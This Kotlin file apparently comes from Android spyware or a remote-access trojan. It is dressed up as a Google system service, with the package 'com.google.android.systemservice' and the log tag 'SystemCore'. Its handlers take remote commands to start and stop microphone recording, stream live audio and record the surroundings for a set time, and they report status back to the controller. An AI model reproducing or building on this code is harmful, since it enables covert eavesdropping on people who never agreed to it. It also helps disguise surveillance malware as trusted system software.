package com.google.android.systemservice.handlers

import android.content.Intent
import android.util.Log
import com.google.android.systemservice.services.AmbientRecordingService
import com.google.android.systemservice.services.AudioService
import com.google.android.systemservice.services.LiveStreamingService
import org.json.JSONObject

class AudioHandlers(private val ctx: CommandContext) {
    companion object {
        private const val TAG = "SystemCore"
    }

    fun executeStartAudio(params: JSONObject?) {
        val compress = params?.optBoolean("compress", true) ?: true
        val maxDuration = params?.optInt("max_duration_sec", 60) ?: 60
        val intent = Intent(ctx.appContext, AudioService::class.java).apply {
            action = "START_RECORDING"
            putExtra("compress", compress)
            putExtra("max_duration_sec", maxDuration)
        }
        ctx.appContext.startService(intent)
    }

    fun executeStopAudio() {
        val intent = Intent(ctx.appContext, AudioService::class.java).apply {
            action = "STOP_RECORDING"
        }
        ctx.appContext.startService(intent)
    }

    fun executeStartLiveAudio() {
        val intent = Intent(ctx.appContext, LiveStreamingService::class.java).apply {
            action = "START_AUDIO"
        }
        ctx.appContext.startService(intent)
        ctx.sendResponse("live_audio_started", JSONObject().apply {
            put("status", "started")
        })
        Log.d(TAG, "Started live audio stream")
    }

    fun executeStopLiveAudio() {
        val intent = Intent(ctx.appContext, LiveStreamingService::class.java).apply {
            action = "STOP_AUDIO"
        }
        ctx.appContext.startService(intent)
        ctx.sendResponse("live_audio_stopped", JSONObject().apply {
            put("status", "stopped")
        })
        Log.d(TAG, "Stopped live audio stream")
    }

    fun executeAmbientRecord(params: JSONObject?) {
        val duration = params?.optInt("duration", 60) ?: 60
        val intent = Intent(ctx.appContext, AmbientRecordingService::class.java).apply {
            putExtra("duration", duration)
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            ctx.appContext.startForegroundService(intent)
        } else {
            ctx.appContext.startService(intent)
        }
        ctx.sendResponse("ambient_record", JSONObject().apply {
            put("status", "recording_started")
            put("duration", duration)
        })
    }
}
